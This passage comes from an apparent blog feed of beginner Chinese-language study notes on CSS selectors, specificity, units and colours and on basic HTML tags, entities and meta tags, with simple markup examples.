class="line">&#125;</span><br></pre></td></tr></table></figure><p>含有就行</p><h2 id="伪类选择器-不存在的类">伪类选择器(不存在的类)</h2><p>一个冒号</p><p>伪类（第一个元素，被点击的元素，鼠标移入地元素）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ul &gt; li:first-child&#123;</span><br><span class="line">                </span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><p>第一个子元素</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ul &gt; li:last-child&#123;</span><br><span class="line">                </span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><p>最后一个</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> ul &gt; li:nth-child()&#123;       </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第n个范围到正无穷</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> ul &gt; li:2nth-child(2n)&#123;       </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>表示选择偶数位的元素</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> ul &gt; li:nth-child(2n+1)&#123;       </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>表示基数</p><p>:first-of-type</p><p>…同类型的一类的进行排序来选择</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ul &gt; :li:not(:first-child(3))</span><br></pre></td></tr></table></figure><h2 id="超链接的伪类">超链接的伪类</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en`&quot;&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">        &lt;meta name=&quot;test&quot; content=&quot;width-device-width&quot;&gt;</span><br><span class="line">        &lt;meta http-equiv=&quot;x-ua-compatible&quot; content=&quot;ie-edge&quot;&gt;</span><br><span class="line">        &lt;time datetime=&quot;gogog&quot;&gt;&lt;/time&gt;</span><br><span class="line">        &lt;style&gt;</span><br><span class="line">            a.link&#123;</span><br><span class="line">                color: rebeccapurple</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &lt;/style&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;a href=&quot;https://mengnankk.asia&quot;&gt;&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">       </span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>link表示的是正常的链接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en`&quot;&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">        &lt;meta name=&quot;test&quot; content=&quot;width-device-width&quot;&gt;</span><br><span class="line">        &lt;meta http-equiv=&quot;x-ua-compatible&quot; content=&quot;ie-edge&quot;&gt;</span><br><span class="line">        &lt;time datetime=&quot;gogog&quot;&gt;&lt;/time&gt;</span><br><span class="line">        &lt;style&gt;</span><br><span class="line">            a.visited&#123;</span><br><span class="line">                color: rebeccapurple</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &lt;/style&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;a href=&quot;https://mengnankk.asia&quot;&gt;&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">       </span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>visited是访问过的链接</p><p>这个只能改变访问过链接的颜色</p><ul><li>hover表示鼠标移入的状态</li><li>active表示鼠标点击的状态</li></ul><h2 id="伪元素选择器">伪元素选择器</h2><p>P::first-letter</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">P::first-letter&#123;</span><br><span class="line">                </span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><p>第一个</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">first-line第一行</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">selection选中的</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">::before</span><br><span class="line"></span><br><span class="line">::after</span><br></pre></td></tr></table></figure><p>开始和结束</p><p>必须集合content来使用，通过css添加</p><h2 id="样式的继承">样式的继承</h2><p>为一个元素设置的样式，也会应用到它的后代元素中</p><p>在继承上通用的样式，应用到共同的祖先元素上</p><p>并不是所有的样式都会继承，例如背景相关的，布局相关的不会被继承</p><h2 id="选择器的权重">选择器的权重</h2><p>样式的冲突：通过不同的选择器选择相同的元素，为相同的元素设置不同的值时，就会出现冲突。就会由选择器的权重决定</p><p>权重：</p><ul><li>内联样式1000</li><li>id选择器      100</li><li>类的伪类      10</li><li>元素选择器    1</li></ul><p><strong>比较时，需要把所有选择器的优先级相加，最后优先级越高，越优先显示（分组选择器的单独计算的）</strong></p><p><strong>选择器的累加，不会超过其最大的数量级，无法跨越数量级</strong></p><p><strong>如何优先级相等，则优先使用靠下的样式</strong></p><p><strong>统配选择器优先级时0，继承的样式没有优先级</strong></p><p>!important在某一个样式后加上，就会变成最高级的优先级，开发中一定要慎用</p><h2 id="单位">单位</h2><h3 id="长度的单位">长度的单位</h3><p>像素：显示器是由一个个的小点构成的，像素越小的屏幕，显示的效果越清晰</p><p>所以同样的200像素在不同的设备下显示的效果不同</p><p>px是像素点</p><p>也可以设置百分比，设置为父元素的属性的百分比</p><p>百分比的好处，可以是子元素跟随父元素的改变而改变</p><h3 id="em-rem">em/rem</h3><p>em是相对于元素的字体大小计算的</p><p>1em = 1font-size</p><p>em的单位会根据字体的大小改变而改变</p><p>rem是根据根元素的字体大小的改变而改变</p><p>移动端使用rem比较多一点</p><h2 id="颜色">颜色</h2><p>在css中使用颜色名来设置各种颜色，但是不太方便</p><p>颜色的编号来使用</p><p>rgb值来表示颜色，通过三种颜色的浓度来调配出不同的颜色</p><p>就是红色绿色蓝色几种颜色的占比</p><p>每一种颜色的范围在0~255之间（0~100%）之间</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.box1&#123;</span><br><span class="line">color: rgb(255,255,10);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>通过这个来</p><p>三个值都是0为黑色，都是255就是白色</p><p>十六进制的rgb值</p><p>#ff000;表示红色</p><p>两位两位重复，可以简写</p><p>#ffffff    =  #fff</p><p>hsl hsla来表示颜色</p><ul><li>h 色相</li><li>s 饱和度</li><li>l亮度</li></ul><p>hsl(0~360,0~100，0~100)亮度0是黑色</p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> css </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTML basic</title>
      <link href="/2024/07/11/html1/"/>
      <url>/2024/07/11/html1/</url>
      
        <content type="html"><![CDATA[<h1>HTML</h1><h2 id="基础结构">基础结构</h2><p>标记：标记是什么东西</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;标签名&gt;aaaa&lt;/标签名&gt;</span><br></pre></td></tr></table></figure><p><strong>一对标签</strong></p><p><strong>aaaa标签的内容</strong></p><p><strong>标签有开始和结束,每一个标签都有自己的作用</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>题目<span class="tag">&lt;/<span class="name">h1</span>&gt;</span>#一级标题</span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>作者<span class="tag">&lt;/<span class="name">h2</span>&gt;</span>#二级标签</span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>aaaaaa<span class="tag">&lt;/<span class="name">p</span>&gt;</span>#内容</span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>aaaaaa<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>aaaaa<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span>#头部，网页中的源数据，给浏览器看，搜索引擎看的，网页中不会显示</span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>诗<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>#网页的主题，可见的内容</span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>题目<span class="tag">&lt;/<span class="name">h1</span>&gt;</span>#一级标题</span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>作者<span class="tag">&lt;/<span class="name">h2</span>&gt;</span>#二级标签</span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>aaaaaa<span class="tag">&lt;/<span class="name">p</span>&gt;</span>#内容</span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>aaaaaa<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>aaaaa<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="自结束标签和注释">自结束标签和注释</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">这里是注释，注释是不能嵌套的。因为会解析到前一个--&gt;</span>导致缺少一个解析</span><br><span class="line">--&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>上面是标准标签，两种写法都是对的。</p><h2 id="标签中的属性">标签中的属性</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>My First HTML Page<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello World!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span>This is my <span class="tag">&lt;<span class="name">font</span> <span class="attr">color</span>=<span class="string">&#x27;red&#x27;</span> <span class="attr">size</span>=<span class="string">&#x27;10&#x27;</span>&gt;</span>first<span class="tag">&lt;/<span class="name">font</span>&gt;</span> HTML page.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">属性，在开始标签中设置属性，是一个名值对（x=y）这样一个类似的结构。属性用来设置标签中的内容如何显示</span></span><br><span class="line"><span class="comment">属性名不能瞎写，属性名和标签名或者其他属性应该使用空格隔开，有的属性有值，有的没有值。属性值应该被引号引起来。</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br></pre></td></tr></table></figure><p><strong>print:</strong></p><h1>Hello World!</h1><p>This is my <font color='red' size='5'>first</font> HTML page.</p><h2 id="文档声明">文档声明</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>My First HTML Page<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello World!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span>This is my <span class="tag">&lt;<span class="name">font</span> <span class="attr">color</span>=<span class="string">&#x27;red&#x27;</span> <span class="attr">size</span>=<span class="string">&#x27;10&#x27;</span>&gt;</span>first<span class="tag">&lt;/<span class="name">font</span>&gt;</span> HTML page.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>文档声明：告诉浏览器当前网页的版本</p><p>html5的文档说明:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype <span class="keyword">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在网页的最开头，所以代码变成</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>My First HTML Page<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello World!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span>This is my <span class="tag">&lt;<span class="name">font</span> <span class="attr">color</span>=<span class="string">&quot;&#x27;red&quot;</span>&gt;</span>first<span class="tag">&lt;/<span class="name">font</span>&gt;</span> HTML page.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="字符编码">字符编码</h2><p>读取的时候将二进制转变为字符</p><p>编码和解码</p><p>编码解码的规则叫做字符集（charset)</p><p>如果编码和解码所采用的字符集不同会出现乱码问题</p><p>常见的字符集</p><ul><li>ASCII <strong>128</strong></li><li>ISO88591 <strong>256欧洲</strong></li><li>GBK    <strong>国标</strong></li><li>UTF-8   <strong>万国码</strong></li><li>GB2312    <strong>国标</strong></li></ul><p>默认utf-8</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&#x27;en&#x27;</span>&gt;</span><span class="comment">&lt;!--语言为英文--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span> = <span class="string">&#x27;utf-8&#x27;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>My First HTML Page<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello World!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span>This is my <span class="tag">&lt;<span class="name">font</span> <span class="attr">color</span>=<span class="string">&quot;&#x27;red&quot;</span>&gt;</span>first<span class="tag">&lt;/<span class="name">font</span>&gt;</span> HTML page.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>设置字符集</strong></p><h2 id="实体">实体</h2><p>多个空格会自动解析第一个空格</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;b&gt;加粗</span><br></pre></td></tr></table></figure><p>在html里，不能直接书写特殊的符号</p><p>书写特殊符号，则需要使用实体</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&amp;nbsp空格实体</span><br><span class="line">&amp;gt大于</span><br><span class="line">&amp;lt小于</span><br><span class="line">&amp;copy版权</span><br></pre></td></tr></table></figure><table><thead><tr><th style="text-align:left">显示结果</th><th style="text-align:left">描述</th><th style="text-align:left">实体名称</th><th style="text-align:left">实体编号</th></tr></thead><tbody><tr><td style="text-align:left"></td><td style="text-align:left">空格</td><td style="text-align:left"> </td><td style="text-align:left"> </td></tr><tr><td style="text-align:left">&lt;</td><td style="text-align:left">小于号</td><td style="text-align:left">&lt;</td><td style="text-align:left">&lt;</td></tr><tr><td style="text-align:left">&gt;</td><td style="text-align:left">大于号</td><td style="text-align:left">&gt;</td><td style="text-align:left">&gt;</td></tr><tr><td style="text-align:left">&amp;</td><td style="text-align:left">和号</td><td style="text-align:left">&amp;</td><td style="text-align:left">&amp;</td></tr><tr><td style="text-align:left">&quot;</td><td style="text-align:left">引号</td><td style="text-align:left">&quot;</td><td style="text-align:left">&quot;</td></tr><tr><td style="text-align:left">’</td><td style="text-align:left">撇号</td><td style="text-align:left">' (IE不支持)</td><td style="text-align:left">'</td></tr><tr><td style="text-align:left">￠</td><td style="text-align:left">分（cent）</td><td style="text-align:left">¢</td><td style="text-align:left">¢</td></tr><tr><td style="text-align:left">£</td><td style="text-align:left">镑（pound）</td><td style="text-align:left">£</td><td style="text-align:left">£</td></tr><tr><td style="text-align:left">¥</td><td style="text-align:left">元（yen）</td><td style="text-align:left">¥</td><td style="text-align:left">¥</td></tr><tr><td style="text-align:left">€</td><td style="text-align:left">欧元（euro）</td><td style="text-align:left">€</td><td style="text-align:left">€</td></tr><tr><td style="text-align:left">§</td><td style="text-align:left">小节</td><td style="text-align:left">§</td><td style="text-align:left">§</td></tr><tr><td style="text-align:left">©</td><td style="text-align:left">版权（copyright）</td><td style="text-align:left">©</td><td style="text-align:left">©</td></tr><tr><td style="text-align:left">®</td><td style="text-align:left">注册商标</td><td style="text-align:left">®</td><td style="text-align:left">®</td></tr><tr><td style="text-align:left">™</td><td style="text-align:left">商标</td><td style="text-align:left">™</td><td style="text-align:left">™</td></tr><tr><td style="text-align:left">×</td><td style="text-align:left">乘号</td><td style="text-align:left">×</td><td style="text-align:left">×</td></tr><tr><td style="text-align:left">÷</td><td style="text-align:left">除号</td><td style="text-align:left">÷</td><td style="text-align:left">÷</td></tr></tbody></table><h2 id="meta标签">meta标签</h2><p>设置网页的源数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta&gt;</span><br><span class="line">name指定的数据的名称</span><br><span class="line">content指定的数据的值</span><br><span class="line">charset字符集</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta name=&#x27;keyword&#x27; content=&#x27;前端&#x27;&gt;</span><br></pre></td></tr></table></figure><p>表示网页的关键字（搜索应用的）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta name=&#x27;descripton&#x27; content=&#x27;描述&#x27;&gt;</span><br></pre></td></tr></table></figure><p>网站的描述,会显示搜索引擎的页面</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv=&#x27;refresh&#x27; content=&#x27;3;url=https://mengnankk.asia&#x27;&gt;</span><br></pre></td></tr></table></figure><p>将页面3秒后重定向到另一个网站</p><h2 id="语义化的标签">语义化的标签</h2><p>html只是一个结构，表现通过css控制</p><p>应该关注的是标签的语义</p><h3 id="标题标签">标题标签</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;h1&gt;&lt;/h1&gt;</span><br><span class="line">&lt;h2&gt;&lt;/h2&gt;</span><br><span class="line">&lt;h3&gt;&lt;/h3&gt;</span><br><span class="line">&lt;h4&gt;&lt;/h4&gt;</span><br><span class="line">&lt;h5&gt;&lt;/h5&gt;</span><br><span class="line">&lt;h6&gt;&lt;/h6&gt;</span><br></pre></td></tr></table></figure><p>一共六级标题</p><p>h1-h6重要性依次递减，h1的重要性仅次于title，一般情况下只有一个</p><p>h1-h3一般常用剩下的用的很少</p><p>标题标签会独占一行，独占一行的元素成为块元素</p><h3 id="段落标签">段落标签</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;p&gt;</span><br><span class="line">啊啊啊啊</span><br><span class="line">&lt;/p&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>也是独占一行，为块元素</p><h3 id="hgroup标签">hgroup标签</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;hgroup&gt;</span><br><span class="line">&lt;h1&gt;&lt;/h1&gt;</span><br><span class="line">&lt;h2&gt;&lt;/2&gt;</span><br><span class="line">&lt;/hgroup&gt;</span><br></pre></td></tr></table></figure><p>用来为标题分组，可以将一组相关的标题同时放入hgroup内</p><h3 id="em标签">em标签</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;p&gt;aaaaa&lt;em&gt;a&lt;/em&gt;aa&lt;/p&gt;</span><br></pre></td></tr></table></figure><p>em标签表示语音语调的加重，<strong>不会独占一行，叫做行内元素</strong></p><p>aaaaa<em>卧槽</em>aa</p><h3 id="strong标签">strong标签</h3><p>表示强调，和em用法一样</p><p>aaaaa<strong>wwww</strong>aa</p><h3 id="blockquote标签">blockquote标签</h3><p>blockquote表示引用，也是块元素</p><blockquote> aaaaaaa </blockquote><h3 id="q引用">q引用</h3><p>q表示一个短引用</p><h3 id="br标签">br标签</h3><p>br标签表示换行</p><p>aaaaa<em>a</em>a    <br>a</p><h3 id="块元素和行内元素">块元素和行内元素</h3><p>块元素用来进行网页的布局，是一块一块的，宏观的布局</p><p>行内元素是用来包裹文字，文字需要设置什么样的效果</p><ul><li>一般会在块元素中放行内元素，不会在行内元素中放块元素</li><li>p元素中不能放任何的块元素</li><li>块元素中一般什么都能放</li></ul><p>浏览器会在一些特殊情况下进行纠正，会在代码在内存的结构</p><h3 id="布局标签-结构化标签">布局标签/结构化标签</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;header&gt;&lt;/header&gt;网页的头部</span><br><span class="line">&lt;main&gt;&lt;/main&gt;头部往下的主体部分（一个页面中只有一个</span><br><span class="line">&lt;footer&gt;&lt;/footer&gt;网页的页脚</span><br><span class="line">&lt;nav&gt;&lt;/nav&gt;网页中的导航</span><br><span class="line">&lt;aside&gt;&lt;/aside&gt;表示和主题相关的其他类，侧边狼啥的</span><br><span class="line">&lt;article&gt;&lt;/article&gt;表示文章</span><br><span class="line">&lt;section&gt;&lt;/section&gt;表示一个独立的区块，表示其他</span><br><span class="line">&lt;div&gt;&lt;/div&gt;表示一个区块，可以代替上述的所有</span><br><span class="line">&lt;span&gt;&lt;/span&gt;m表示行内元素，一般用于选中文字</span><br></pre></td></tr></table></figure><div></div>表示一个区块，可以代替上述的所有<h2 id="列表">列表</h2><p>list列表</p><p>1.有序列表</p><p>ol</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 